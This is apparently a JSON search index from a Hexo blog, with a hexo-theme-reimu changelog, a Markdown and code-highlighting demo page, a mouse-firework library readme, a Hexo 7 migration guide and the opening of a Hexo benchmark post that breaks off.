[{"title":"hexo-theme-reimu开发日志","url":"/reimu-lighthouse/20240601/hexo-theme-reimu-log/","content":"\nhexo-theme-reimu 的开发日志\n\n## v0.2.0(WIP)\n\n### 修复\n\n- 修复了在使用 [hexo-blog-encrypt](https://github.com/D0n9X1n/hexo-blog-encrypt) 时代码块样式显示异常\n- 修复了 pjax 模式下 waline 的内存泄露问题\n\n### 特性\n\n- 新增了文章版权展示的功能，默认关闭\n  ```yaml\n  article_copyright:\n  enable: # true | false 是否展示版权卡片？\n  content:\n    author: # true | false 版权卡片展示作者？\n    link: # true | false 版权卡片展示链接？\n    title: # true | false 版权卡片展示标题？\n    date: # true | false 版权卡片展示创建日期？\n    updated: # true | false 版权卡片展示更新日期？\n    license: # true | false 版权卡片展示协议？\n  ```\n- 新增了内链/外链卡片的标签\n  - postLinkCard\n    ```yaml\n    {% postLinkCard slug [cover]|\"auto\" [escape] %}\n    ```\n    其中第一个参数为文章的 `slug`；第二个参数（可选）为卡片展示的封面，如果设置为 `auto` 则自动使用博客的 `banner`；第三个参数（可选）表示文章标题是否被转义\n  - externalLinkCard\n    ```yaml\n    {% externalLinkCard title link [cover]|\"auto\" %}\n    ```\n    其中第一个参数为文章的标题；第二个参数为文章的外部链接，第三个参数（可选）为卡片展示的封面，如果设置为 `auto` 则自动使用缺省封面\n- 友链优化，现在变得更好看了！\n- 代码区域粘贴优化，现在粘贴后会有图标变化，且会弹出对应消息\n\n### 性能\n\n- banner 和 avatar 改用 webp 格式，降低文件大小\n- Google font 字体优化\n  - `<link rel=\"preconnect\" href=\"https://fonts.gstatic.com/\" crossorigin>`\n  - `<link rel=\"preload\" as=\"style\" href=\"https://fonts.googleapis.com/css\">`\n  - `<link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css\" media=\"print\" onload=\"this.media='all'\">`\n- mermaid 支持懒加载，但现在需要同时在 config 和 `front-matter` 中启用 mermaid\n  ```yaml\n  ---\n  mermaid: true\n  ---\n  ```\n\n### ⚠️ 重构 ⚠️\n\n- 图标改用了 iconfont，但同时也保留了 fontawesome（`icon_font` 为 `false` 时默认使用 fontawesome）\n  ```yaml\n  icon_font: # icon_id | false\n  ```\n- 移除了 JQuery 依赖\n- 移除了 fancybox 依赖，改用 photoswipe\n- 移除了文章分享按钮\n- 移除了部分过时的 css\n\n\n## v0.1.2\n\n**2024-04-27**\n\n### 修复\n\n- 修复了在使用 [hexo-blog-encrypt](https://github.com/D0n9X1n/hexo-blog-encrypt) 时 TOC 无法显示的 bug\n\n## v0.1.1\n\n**2024-04-05**\n\n### 特性\n\n- 新增了可爱灵梦(_╹▽╹_)鼠标指针，默认开启\n  ```yaml\n  reimu_cursor: # true | false\n  ```\n- 新增了 clarity 统计\n  ```yaml\n  clarity: # clarity ID\n  ```\n- 移除了废弃的 gauges 统计，以下配置现在不可用\n  ```yaml\n  gauges_analytics: # gauges ID\n  ```\n\n### 修复\n\n- 修复了 front-matter 中未填写 `comment` 字段时评论不显示的 bug\n- 修复了 giscus 评论系统宽度显示异常的 bug\n\n### 性能\n\n- 提升了 lighthouse 无障碍相关分数\n- 减少了 `banner.jpg` 的体积\n\n## v0.1.0\n\n**2024-01-14**\n\n🎉🎉🎉 经过了近一年的~~摸鱼~~，v0.1.0 终于发布啦 🎉🎉🎉\n\n### ⚠️ 重构 ⚠️\n\n- [hexo-algolia](https://github.com/thom4parisot/hexo-algolia) 替换为了 [hexo-algoliasearch](https://github.com/LouisBarranqueiro/hexo-algoliasearch)\n- 配置中的 `vendor` 进行了完全重构，现在支持手动切换 CDN：\n  ```yaml\n  vendor:\n    cdn_jsdelivr_gh: https://cdn.jsdelivr.net/gh/\n    cdn_jsdelivr_npm: https://cdn.jsdelivr.net/npm/\n    fastly_jsdelivr_gh: https://fastly.jsdelivr.net/gh/\n    fastly_jsdelivr_npm: https://fastly.jsdelivr.net/npm/\n    unpkg: https://unpkg.com/\n    webcache: https://npm.webcache.cn/\n    js:\n      jquery: webcache|jquery@3.7.1/dist/jquery.min.js\n  ```\n  目前提供了 `jsdelivr/gh`、`jsdelivr/npm`、`fastly.jsdelivr/gh`、`fastly.jsdelivr/npm`、`unpkg` 和 `webcache` 这几个 CDN 源。所有的依赖地址现在的结构为 `CDN源|依赖路径`，在生成博客的过程中主题会自动将 CDN 源和后续路径拼接从而形成完整的地址\n\n### 特性\n\n- ServiceWorker 增加对部分域名的选择缓存\n- 完善 TOC，目前 TOC 可以随着页面滚动而动态更新，也可以通过点击 TOC 跳转到对应锚点\n- 支持了 waline 的阅读统计功能，启用方式：\n  ```yaml\n  waline:\n    pageview: true\n  ```\n\n### 修复\n\n- 修复了 pjax 模式下 mermaid 显示异常的问题\n- 修复了 pjax 模式下 `insert_highlight` 多次调用的 bug\n- 同步了所有动画的持续时间和缓动函数\n- 修复了配置项未填写 `widgets` 后空指针的 bug\n\n### 性能\n\n- 提升了 LCP 分数\n  - google font 采用 `rel:preload` 的方式加载\n  - banner 添加 `fetchpriority=\"high\"`\n  - fontawesome 部分 css 采用 `rel:preload` 的方式加载\n\n## v0.0.11\n\n**2024-01-10**\n\n### 特性\n\n- 新增了 ServiceWorker 功能，默认开启\n  ```yaml\n  service_worker:\n    enable: # true | false\n  ```\n- 新增了 live2d 功能，默认关闭\n  ```yaml\n  live2d:\n    enable: # true | false\n  ```\n- 导航栏优化，现在支持导航栏随着页面滚动的方向而动态显示和隐藏\n- 代码块现在支持了日夜模式，变得更好看了！\n- 日夜模式颜色 token 优化，变得更好看了！\n\n## v0.0.10\n\n**2024-01-07**\n\n### 修复\n\n- 修复了 404 页面不能正常搜索的 bug\n- 修复了 TOC 样式异常\n\n### 特性\n\n- 现在不仅仅支持 algolia 搜索，也支持使用 [hexo-generate-search](https://github.com/wzpan/hexo-generator-search) 进行搜索了\n  ```yaml\n  generator_search:\n    enable: # true | false\n  ```\n- 新增了鼠标烟火效果，默认开启（具体配置可以看 [mouse-firework](https://github.com/D-Sketon/mouse-firework)，也是本人写的一个库）\n  ```yaml\n  firework:\n  enable: # true | false\n  options:\n    excludeElements: [\"a\"]\n    particles:\n      - shape: circle\n        move: [\"emit\"]\n        easing: easeOutExpo\n        colors: [\"#ff5252\", \"#ff7c7c\", \"#ffafaf\", \"#ffd0d0\"]\n        number: 20\n        duration: [1200, 1800]\n        shapeOptions:\n          radius: [16, 32]\n          alpha: [0.3, 0.5]\n      - shape: circle\n        move: [\"diffuse\"]\n        easing: easeOutExpo\n        colors: [\"#ff0000\"]\n        number: 1\n        duration: [1200, 1800]\n        shapeOptions:\n          radius: 20\n          alpha: [0.2, 0.5]\n          lineWidth: 6\n  ```\n- 新增了 pjax 功能，但目前仍然不稳定，会有很多 bug，默认关闭\n  ```yaml\n  pjax:\n    enable: # true | false\n  ```\n\n## v0.0.9\n\n**2024-01-01**\n\n### 修复\n\n- 修复了缓存设置异常造成的 TOC 显示不正确的 bug\n- 修复了 valine 评论数显示异常的 bug\n\n### 特性\n\n- 回到顶部按钮变得更好看了\n- TOC 新增了切换到首页的按钮\n- 支持了 valine 的阅读统计功能，启用方式：\n  ```yaml\n  valine:\n    visitor: true\n  ```\n\n## v0.0.8\n\n**2023-12-31**\n\n### 特性\n\n- 万众期待的 TOC 终于实现了~~一部分~~\n- fontawesome 升级到 v6，同时为 `social` 新增了一堆图标\n- 新增了回到顶部按钮\n- 日夜模式颜色 token 优化，变得更好看了！\n- 适配 hexo v7\n\n## v0.0.7\n\n**2023-09-09**\n\n### 修复\n\n- 修复了 lazyload 和 fancybox 冲突的 bug\n- 新增了更多的封面选项\n\n## v0.0.6\n\n**2023-07-02**\n\n### 修复\n\n- 修复了移动端分页显示异常\n\n### 特性\n\n- 新增了过渡动画功能，默认开启\n  ```yaml\n  animation:\n    enable: # true | false\n  ```\n- 新增了日夜模式功能，可以通过以下配置设置默认模式\n  ```yaml\n  dark_mode:\n    enable: # true | false\n  ```\n\n## v0.0.5\n\n**2023-06-30**\n\n### 特性\n\n- 新增了加载动画功能，默认开启\n  ```yaml\n  preloader:\n    enable: # true | false\n    text: # 加载文本\n  ```\n- 新增了版本检查功能，如果发现了主题的新版本会在控制台中提示\n\n### 重构\n\n- 移除本地 Ubuntu Mono 字体\n- 移除本地 fontawesome 字体\n\n## v0.0.4\n\n**2023-06-26**\n\n### 特性\n\n- 新增了百度统计\n\n  ```yaml\n  baidu_analytics: # baidu ID\n  ```\n\n- 新增了 waline 评论系统\n  ```yaml\n  waline:\n    enable: # true | false\n    serverURL:\n    lang: zh-CN\n    locale: {} # https://waline.js.org/guide/features/i18n.html#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80\n    emoji:\n      - https://unpkg.com/@waline/emojis@1.2.0/weibo\n      - https://unpkg.com/@waline/emojis@1.2.0/alus\n      - https://unpkg.com/@waline/emojis@1.2.0/bilibili\n      - https://unpkg.com/@waline/emojis@1.2.0/qq\n      - https://unpkg.com/@waline/emojis@1.2.0/tieba\n      - https://unpkg.com/@waline/emojis@1.2.0/tw-emoji\n    meta:\n      - nick\n      - mail\n      - link\n    requiredMeta:\n      - nick\n      - mail\n    wordLimit: 0\n    pageSize: 10\n  ```\n- 新增了 twikoo 评论系统\n  ```yaml\n  twikoo:\n    enable: # true | false\n    envId: # 腾讯云环境填 envId；Vercel 环境填地址（https://xxx.vercel.app）\n    region:\n  ```\n- 新增了 gitalk 评论系统\n  ```yaml\n  gitalk:\n    enable: # true | false\n    clientID:\n    clientSecret:\n    repo:\n    owner:\n    admin:\n  ```\n- 新增了 giscus 评论系统\n  ```yaml\n  giscus:\n    enable: # true | false\n    repo:\n    repoId:\n    category:\n    categoryId:\n    mapping:\n    strict:\n    reactionsEnabled:\n    emitMetadata:\n    inputPosition:\n    commentTheme:\n    lang:\n  ```\n","tags":["Hexo"],"categories":["计软杂谈","hexo"]},{"title":"hexo-theme-reimu效果展示","url":"/reimu-lighthouse/20240114/hexo-theme-reimu-content/","content":"\n## Markdown 基本元素\n\n### 标题\n\n# H1\n\n## H2\n\n### H3\n\n#### H4\n\n##### H5\n\n###### H6\n\n### 强调\n\nEmphasis, aka italics, with _asterisks_ or _underscores_.\n\nStrong emphasis, aka bold, with **asterisks** or **underscores**.\n\nCombined emphasis with **asterisks and _underscores_**.\n\nStrikethrough uses two tildes. ~~Scratch this.~~\n\n### 列表\n\n#### Definition List (dl)\n\n<dl><dt>Definition List Title</dt><dd>This is a definition list division.</dd></dl>\n\n#### Ordered List (ol)\n\n1. List Item 1\n2. List Item 2\n3. List Item 3\n\n#### Unordered List (ul)\n\n- List Item 1\n- List Item 2\n- List Item 3\n\n### 段落\n\nLorem ipsum dolor sit amet, [test link]() consectetur adipiscing elit. **Strong text** pellentesque ligula commodo viverra vehicula. _Italic text_ at ullamcorper enim. Morbi a euismod nibh. <u>Underline text</u> non elit nisl. ~~Deleted text~~ tristique, sem id condimentum tempus, metus lectus venenatis mauris, sit amet semper lorem felis a eros. Fusce egestas nibh at sagittis auctor. Sed ultricies ac arcu quis molestie. Donec dapibus nunc in nibh egestas, vitae volutpat sem iaculis. Curabitur sem tellus, elementum nec quam id, fermentum laoreet mi. Ut mollis ullamcorper turpis, vitae facilisis velit ultricies sit amet. Etiam laoreet dui odio, id tempus justo tincidunt id. Phasellus scelerisque nunc sed nunc ultricies accumsan.\n\nInterdum et malesuada fames ac ante ipsum primis in faucibus. `Sed erat diam`, blandit eget felis aliquam, rhoncus varius urna. Donec tellus sapien, sodales eget ante vitae, feugiat ullamcorper urna. Praesent auctor dui vitae dapibus eleifend. Proin viverra mollis neque, ut ullamcorper elit posuere eget.\n\n> This is a very long line that will still be quoted properly when it wraps. Oh boy let's keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can _put_ **Markdown** into a blockquote.\n\nMaecenas ornare arcu at mi suscipit, non molestie tortor ultrices. Aenean convallis, diam et congue ultricies, erat magna tincidunt orci, pulvinar posuere mi sapien ac magna. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Praesent vitae placerat mauris. Nullam laoreet ante posuere tortor blandit auctor. Sed id ligula volutpat leo consequat placerat. Mauris fermentum dolor sed augue malesuada sollicitudin. Vivamus ultrices nunc felis, quis viverra orci eleifend ut. Donec et quam id urna cursus posuere. Donec elementum scelerisque laoreet.\n\n### 表格\n\n| Table Header 1 | Table Header 2 | Table Header 3 |\n| -------------- | -------------- | -------------- |\n| Division 1     | Division 2     | Division 3     |\n| Division 1     | Division 2     | Division 3     |\n| Division 1     | Division 2     | Division 3     |\n\n| Markdown | Less      | Pretty     |\n| -------- | --------- | ---------- |\n| _Still_  | `renders` | **nicely** |\n| 1        | 2         | 3          |\n\n### 其他元素 - abbr, acronym, sub, sup, kbd, etc.\n\nLorem <sup>superscript</sup> dolor <sub>subscript</sub> amet, consectetuer adipiscing elit. Nullam dignissim convallis est. Quisque aliquam. <cite>cite</cite>. Nunc iaculis suscipit dui. Nam sit amet sem. Aliquam libero nisi, imperdiet at, tincidunt nec, gravida vehicula, nisl. Praesent mattis, massa quis luctus fermentum, turpis mi volutpat justo, eu volutpat enim diam eget metus. Maecenas ornare tortor. Donec sed tellus eget sapien fringilla nonummy. <acronym title=\"National Basketball Association\">NBA</acronym> Mauris a ante. Suspendisse quam sem, consequat at, commodo vitae, feugiat in, nunc. Morbi imperdiet augue quis tellus. <abbr title=\"Avenue\">AVE</abbr>. Use <kbd>Crtl</kbd> + <kbd>C</kbd> to stop.\n\n### 图片\n\n![image](https://d-sketon.top/img/backwebp/bg1.webp)\n\n## 代码块\n\n```plain\nLorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book.\n```\n\n```rust\n#[derive(Debug)]\npub enum State {\n    Start,\n    Transient,\n    Closed,\n}\n\nimpl From<&'a str> for State {\n    fn from(s: &'a str) -> Self {\n        match s {\n            \"start\" => State::Start,\n            \"closed\" => State::Closed,\n            _ => unreachable!(),\n        }\n    }\n}\n```\n\n```json\n[\n  {\n    \"title\": \"apples\",\n    \"count\": [12000, 20000],\n    \"description\": { \"text\": \"...\", \"sensitive\": false }\n  },\n  {\n    \"title\": \"oranges\",\n    \"count\": [17500, null],\n    \"description\": { \"text\": \"...\", \"sensitive\": false }\n  }\n]\n```\n\n```python\n@requires_authorization\ndef somefunc(param1='', param2=0):\n    r'''A docstring'''\n    if param1 > param2: # interesting\n        print 'Gre\\'ater'\n    return (param2 - param1 + 1 + 0b10l) or None\n\nclass SomeClass:\n    pass\n\n>>> message = '''interpreter\n... prompt'''\n```\n\n```html\n<!DOCTYPE html>\n<title>Title</title>\n\n<style>\n  body {\n    width: 500px;\n  }\n</style>\n\n<script type=\"application/javascript\">\n  function $init() {\n    return true;\n  }\n</script>\n\n<body>\n  <p checked class=\"title\" id=\"title\">Title</p>\n  <!-- here goes the rest of the page -->\n</body>\n```\n\n```javascript\nfunction $initHighlight(block, cls) {\n  try {\n    if (cls.search(/\\bno\\-highlight\\b/) != -1)\n      return process(block, true, 0x0F) +\n             ` class=\"${cls}\"`;\n  } catch (e) {\n    /* handle exception */\n  }\n  for (var i = 0 / 2; i < classes.length; i++) {\n    if (checkCondition(classes[i]) === undefined)\n      console.log('undefined');\n  }\n\n  return (\n    <div>\n      <web-component>{block}</web-component>\n    </div>\n  )\n}\n\nexport $initHighlight;\n```\n\n```cpp\n#include <iostream>\n\nint main(int argc, char *argv[]) {\n\n  /* An annoying \"Hello World\" example */\n  for (auto i = 0; i < 0xFFFF; i++)\n    cout << \"Hello, World!\" << endl;\n\n  char c = '\\n';\n  unordered_map <string, vector<string> > m;\n  m[\"key\"] = \"\\\\\\\\\"; // this is an error\n\n  return -2e3 + 12l;\n}\n```\n\n```sql\nCREATE TABLE \"topic\" (\n    \"id\" serial NOT NULL PRIMARY KEY,\n    \"forum_id\" integer NOT NULL,\n    \"subject\" varchar(255) NOT NULL\n);\nALTER TABLE \"topic\"\nADD CONSTRAINT forum_id FOREIGN KEY (\"forum_id\")\nREFERENCES \"forum\" (\"id\");\n\n-- Initials\ninsert into \"topic\" (\"forum_id\", \"subject\")\nvalues (2, 'D''artagnian');\n```\n\n```objectivec\n#import <UIKit/UIKit.h>\n#import \"Dependency.h\"\n\n@protocol WorldDataSource\n@optional\n- (NSString*)worldName;\n@required\n- (BOOL)allowsToLive;\n@end\n\n@property (nonatomic, readonly) NSString *title;\n- (IBAction) show;\n@end\n```\n\n```java\n/**\n * @author John Smith <john.smith@example.com>\n*/\npackage l2f.gameserver.model;\n\npublic abstract class L2Char extends L2Object {\n  public static final Short ERROR = 0x0001;\n\n  public void moveTo(int x, int y, int z) {\n    _ai = null;\n    log(\"Should not be called\");\n    if (1 > 5) { // wtf!?\n      return;\n    }\n  }\n}\n```\n\n```swift\nimport Foundation\n\n@objc class Person: Entity {\n  var name: String!\n  var age:  Int!\n\n  init(name: String, age: Int) {\n    /* /* ... */ */\n  }\n\n  // Return a descriptive string for this person\n  func description(offset: Int = 0) -> String {\n    return \"\\(name) is \\(age + offset) years old\"\n  }\n}\n```\n\n```css\n@font-face {\n  font-family: Chunkfive;\n  src: url(\"Chunkfive.otf\");\n}\n\nbody,\n.usertext {\n  color: #f0f0f0;\n  background: #600;\n  font-family: Chunkfive, sans;\n}\n\n@import url(print.css);\n@media print {\n  a[href^=\"http\"]::after {\n    content: attr(href);\n  }\n}\n```\n\n```ruby\n# The Greeter class\nclass Greeter\n  def initialize(name)\n    @name = name.capitalize\n  end\n\n  def salute\n    puts \"Hello #{@name}!\"\n  end\nend\n\ng = Greeter.new(\"world\")\ng.salute\n```\n\n```makefile\n# Makefile\n\nBUILDDIR      = _build\nEXTRAS       ?= $(BUILDDIR)/extras\n\n.PHONY: main clean\n\nmain:\n\t@echo \"Building main facility...\"\n\tbuild_main $(BUILDDIR)\n\nclean:\n\trm -rf $(BUILDDIR)/*\n```\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n    ch := make(chan float64)\n    ch <- 1.0e10    // magic number\n    x, ok := <- ch\n    defer fmt.Println(`exitting now\\`)\n    go println(len(\"hello world!\"))\n    return\n}\n```\n\n```bash\n#!/bin/bash\n\n###### CONFIG\nACCEPTED_HOSTS=\"/root/.hag_accepted.conf\"\nBE_VERBOSE=false\n\nif [ \"$UID\" -ne 0 ]\nthen\n  echo \"Superuser rights required\"\n  exit 2\nfi\n\ngenApacheConf(){\n  echo -e \"# Host ${HOME_DIR}$1/$2 :\"\n}\n```\n\n```ini\n; boilerplate\n[package]\nname = \"some_name\"\nauthors = [\"Author\"]\ndescription = \"This is \\\na description\"\n\n[[lib]]\nname = ${NAME}\ndefault = True\nauto = no\ncounter = 1_000\n```\n\n## 标签插件\n\n### 引用块\n\n{% blockquote David Levithan, Wide Awake %}\nDo not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.\n{% endblockquote %}\n\n{% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html Welcome to Island Marketing %}\nEvery interaction is both precious and an opportunity to delight.\n{% endblockquote %}\n\n### 代码块\n\n#### 带有标题和 URL\n\n{% codeblock .compact http://underscorejs.org/#compact Underscore.js %}\n.compact([0, 1, false, 2, ‘’, 3]);\n=> [1, 2, 3]\n{% endcodeblock %}\n\n#### 带有选中行\n\n{% codeblock lang:js mark:1,7-8,10 %}\nconst http = require('http');\n\nconst hostname = '127.0.0.1';\nconst port = 1337;\n\nhttp.createServer((req, res) => {\n  res.writeHead(200, { 'Content-Type': 'text/plain' });\n  res.end('Hello World\\n');\n}).listen(port, hostname, () => {\n  console.log(`Server running at http://${hostname}:${port}/`);\n});\n{% endcodeblock %}\n\n### Gist\n\n{% gist 996818 %}\n\n### jsFiddle\n\n{% jsfiddle ccWP7 %}\n\n### Pull Quote\n\n{% pullquote left %}\nLorem ipsum dolor sit amet, consectetur adipiscing elit.\n{% endpullquote %}\n\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas tempus molestie arcu, et fringilla mauris placerat ac. Nullam luctus bibendum risus. Ut cursus sed ipsum feugiat egestas. Suspendisse elementum, velit eu consequat consequat, augue lorem dapibus libero, eget pulvinar dolor est sit amet nulla. Suspendisse a porta tortor, et posuere mi. Pellentesque ultricies, mi quis volutpat malesuada, erat felis vulputate nisl, ac congue ante tortor ut ante. Proin aliquam sem vel mauris tincidunt, eget scelerisque tortor euismod. Nulla tincidunt enim nec commodo dictum. Mauris id sapien et orci gravida luctus id ut dui. In vel vulputate odio. Duis vel turpis molestie, scelerisque enim eu, lobortis eros. Cras at ipsum gravida, sagittis ante vel, viverra tellus. Nunc mauris turpis, elementum ullamcorper nisl pretium, ultrices cursus justo. Mauris porttitor commodo eros, ac ornare orci interdum in. Cras fermentum cursus leo sed mattis. In dignissim lorem sem, sit amet elementum mauris venenatis ac.\n\n\n{% pullquote right %}\nLorem ipsum dolor sit amet, consectetur adipiscing elit.\n{% endpullquote %}\n\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Sed ligula justo, lobortis sit amet semper vel, dignissim sit amet libero. Praesent ac tempus ligula. Maecenas at gravida odio. Etiam tristique volutpat lacus eu faucibus. Donec non tempus arcu. Phasellus adipiscing, mauris nec mollis egestas, ipsum nunc auctor velit, et rhoncus lorem ipsum at ante. Praesent et sem in velit volutpat auctor. Duis vel mauris nulla. Maecenas mattis interdum ante, quis sagittis nibh cursus et. Nulla facilisi. Morbi convallis gravida tortor, ut fermentum enim gravida et. Nunc vel dictum nisl, non ultrices libero. Proin vestibulum felis eget orci consectetur lobortis. Vestibulum augue nulla, iaculis vitae augue vehicula, dignissim ultrices libero. Sed imperdiet urna et quam ultrices tincidunt nec ac magna. Etiam vel pharetra elit.\n\n\n## 数学公式\n\n$f(n) = \\Theta(g(n)) \\land g(n) = \\Theta(h(n)) \\rightarrow f(n) = \\Theta(h(n))$\n\n$\\omega(g(n))=\\{f(n):\\text{存在正常量}c\\text{和}n_0\\text{，使得对所有}n \\geq n_0\\text{，有}0\\leq cg(n) < f(n)\\}$\n\n$$\nf^{(i)}(n) =\n\\begin{cases}\nn \\qquad & i = 1 \\\\\nf(f^{(i-1)}(n)) \\qquad &  i>1\n\\end{cases}\n$$\n\n$$\nA = \\begin{bmatrix}\nA_{11} & A_{12} \\\\\nA_{21} & A_{22}\n\\end{bmatrix}\n,\nB = \\begin{bmatrix}\nB_{11} & B_{12} \\\\\nB_{21} & B_{22}\n\\end{bmatrix}\n,\nC = \\begin{bmatrix}\nC_{11} & C_{12} \\\\\nC_{21} & C_{22}\n\\end{bmatrix}\n$$\n\n$$\\sum^{\\lfloor lgn \\rfloor}_{h=0} \\lceil \\frac{n}{2^{h+1}} \\rceil O(h) = O(n \\sum^{\\lfloor lgn \\rfloor}_{h=0} \\frac{h}{2^h}) =  O(n \\sum^{\\infty}_{h=0} \\frac{h}{2^h}) =O(n)$$\n\n\n## 流程图\n\n```mermaid\n  sequenceDiagram\n  participant 客户端\n  participant 代理对象\n  participant 代理处理器\n  participant 目标对象\n  客户端->>代理对象:调用方法\n  代理对象->>代理处理器:转发代理处理器<br>Invoke()方法\n  代理处理器->>目标对象:判断Method<br>调用目标对象的方法\n  目标对象->>代理处理器:返回结果\n  代理处理器->>代理对象:返回结果\n  代理对象->>客户端:返回结果\n```\n\n```mermaid\n  graph LR\n  c1[Client1<br>Socket]--客户端发出连接-->ss[ServerSocket]\n  c2[Client2<br>Socket]--客户端发出连接-->ss[ServerSocket]\n  ss--服务器接受请求并创建新的Socket-->s1[为Client1创<br>建的Socket]\n  ss--服务器接受请求并创建新的Socket-->s2[为Client2创<br>建的Socket]\n  c1--两个Socket间建立专线连接-->s1\n  c2--两个Socket间建立专线连接-->s2\n```\n\n## 卡片\n\n{% postLinkCard \"hexo-theme-reimu效果展示\" auto %}\n\n{% externalLinkCard \"Github\" \"https://github.com/D-Sketon/hexo-theme-reimu\" \"https://github.githubassets.com/assets/apple-touch-icon-144x144-b882e354c005.png\" %}","tags":["Hexo"],"categories":["计软杂谈","hexo"]},{"title":"为你的网站添加鼠标烟花爆炸效果","url":"/reimu-lighthouse/20240110/mouse-firework-readme/","content":"\n## 前言\n\n最近在为 [Hexo](https://github.com/hexojs/hexo) 的 [ShokaX](https://github.com/theme-shoka-x/hexo-theme-shokaX) 主题进行模块化拆分的过程中，顺便将其中的烟花爆炸效果的代码抽离成了一个库。\n\n![demo](https://fastly.jsdelivr.net/gh/D-Sketon/blog-img/mouse-firework.gif)\n\n{% externalLinkCard Github仓库 https://github.com/D-Sketon/mouse-firework \"https://github.githubassets.com/assets/apple-touch-icon-144x144-b882e354c005.png\" %}\n\n{% externalLinkCard Demo https://d-sketon.github.io/mouse-firework \"https://github.githubassets.com/assets/apple-touch-icon-144x144-b882e354c005.png\" %}\n\n## 特点\n- 零依赖：网络上相关的教程大部分需要依赖anime.js\n- 小体积：压缩后体积在 3KB 以内\n- 定制化：仅需一行代码便能轻松自定义粒子效果\n\n## 使用方式\n\nnpm 引入\n```bash\nnpm i mouse-firework --save\n```\n\n或 html 直接引入\n```html\n<script src=\"https://www.unpkg.com/mouse-firework@latest/dist/index.umd.js\"></script>\n```\n\n### 配置\n仅需一行代码\n```js\nfirework(<options>)\n```\n例如：\n```js\nfirework({\n  excludeElements: [\"a\"],\n  particles: [\n    {\n      shape: \"circle\",\n      move: \"emit\",\n      easing: \"easeOutExpo\",\n      colors: [\n        \"rgba(255,182,185,.9)\",\n        \"rgba(250,227,217,.9)\",\n        \"rgba(187,222,214,.9)\",\n        \"rgba(138,198,209,.9)\",\n      ],\n      number: 30,\n      duration: [1200, 1800],\n      shapeOptions: {\n        radius: [16, 32],\n      },\n    },\n  ]\n});\n```\n**允许配置：**\n- 粒子的形状：圆形、多边形、星形\n    - 半径、透明度、描边粗细等\n- 粒子的运动方式：向四周发射、从中间扩散、旋转\n    - 运动半径、透明度、旋转角度等\n- 粒子的缓动函数：\n- 粒子的颜色：支持数组\n- 粒子的数量\n- 粒子的持续时间\n\n数字均支持输入区间，会从区间中随机采样值","tags":["Hexo"],"categories":["计软杂谈","hexo"]},{"title":"Hexo 7 迁移指南","url":"/reimu-lighthouse/20231111/hexo-7-migration-guide/","content":"\nHexo 7 已正式发布，强烈建议大家向高版本进行迁移以获得更好的体验。\n本文针对于 v6 向 v7 迁移的用户。\n\n## 针对使用者\n\n### 运行环境\n\nHexo 7 需 Node 版本 >=14\n\n### 标签插件\n\n相关 PR: [#5067](https://github.com/hexojs/hexo/pull/5067)、[#5064](https://github.com/hexojs/hexo/pull/5064)、[#5066](https://github.com/hexojs/hexo/pull/5066)、[#5065](https://github.com/hexojs/hexo/pull/5065)\n\n为了保持 Hexo 的高内聚性，以下标签插件从 Hexo 本体中被移除：\n\n```text\n{% youtube video_id [type] [cookie] %}\n{% gist gist_id [filename] %}\n{% jsfiddle shorttag [tabs] [skin] [width] [height] %}\n{% vimeo video_id %}\n```\n\n如果你的文章中使用了以上标签插件，请安装 [hexo-tag-embed](https://github.com/hexojs/hexo-tag-embed)\n\n```bash\n$ npm i hexo-tag-embed\n```\n\n### 代码高亮\n\n相关 PR: [#5095](https://github.com/hexojs/hexo-tag-embed)\n\n代码高亮相关代码被重构，且其配置也发生了改变，目前代码高亮由 `syntax_highlighter` 选项控制，且其值可以为：`highlight.js`、`prismjs` 或 空字符串\n\n原：\n\n```yml\nhighlight:\n  enable: true\n```\n\n现：\n\n```yml\nsyntax_highlighter: highlight.js\n```\n\n原：\n\n```yml\nprismjs:\n  enable: true\n```\n\n现：\n\n```yml\nsyntax_highlighter: prismjs\n```\n\n原：\n\n```yml\nhighlight:\n  enable: false\nprismjs:\n  enable: false\n```\n\n现：\n\n```yml\nsyntax_highlighter:\n```\n\n### external_link\n\n相关 PR: [#5063](https://github.com/hexojs/hexo/pull/5063)\n\n配置文件中，以下写法被移除：\n\n```yml\nexternal_link: true\n```\n\n请使用：\n\n```yml\nexternal_link:\n  enable: true # Open external links in new tab\n  field: site # Apply to the whole site\n  exclude: \"\"\n```\n\n### front-matter\n\n相关 PR: [#5253](https://github.com/hexojs/hexo/pull/5253)\n\nfront-matter 中，`link` 选项被移除。\n\n### updated_option\n\n相关 PR: [#5062](https://github.com/hexojs/hexo/pull/5062)\n\n配置文件中，`use_date_for_updated` 选项已去除。请改为使用 `updated_option: 'date'`。\n\n## 针对开发者\n\n### 访问\\_data 文件夹\n\n相关 PR: [#5325](https://github.com/hexojs/hexo/pull/5325)\n\n> 该特性在官方文档中并不存在\n\n源文件夹中的 `pages` 现在无法通过以下方法访问到 `source/_data` 中的文件：\n\n```html\n<p>Hello {{site.data.foo.name}}</p>\n```\n\n## 官方链接\n\n- [Hexo Site News: v7.0.0](https://hexo.io/news/2023/11/03/hexo-7-0-0-released/)\n- [GitHub Release Note: v7.0.0](https://github.com/hexojs/hexo/releases/tag/v7.0.0)\n","tags":["Hexo"],"categories":["计软杂谈","hexo"]},{"title":"Hexo 5/6/7 生成文章性能对比","url":"/reimu-lighthouse/20231111/hexo-generate-benchmark/","content":"\n最近 Hexo 7 正式发布了，在这一版本中针对生成性能做了一定程度的优化（[#5119](https://github.com/hexojs/hexo/pull/5119)、[#5145](https://github.com/hexojs/hexo/pull/5145)）,本文以此为契机选择对不同版本的 Hexo 生成速度进行性能测试。\n\n## 测试环境\n\n- Node v18.12.1\n- Windows 10 版本 21H2\n- Hexo v5.4.2 / v6.3.0 / v7.0.0\n\n### 测试版本\n\n#### 5.4.2\n\n```text\n+-- hexo-generator-archive@1.0.0\n+-- hexo-generator-category@1.0.0\n+-- hexo-generator-index@2.0.0\n+-- hexo-generator-tag@1.0.0\n+-- 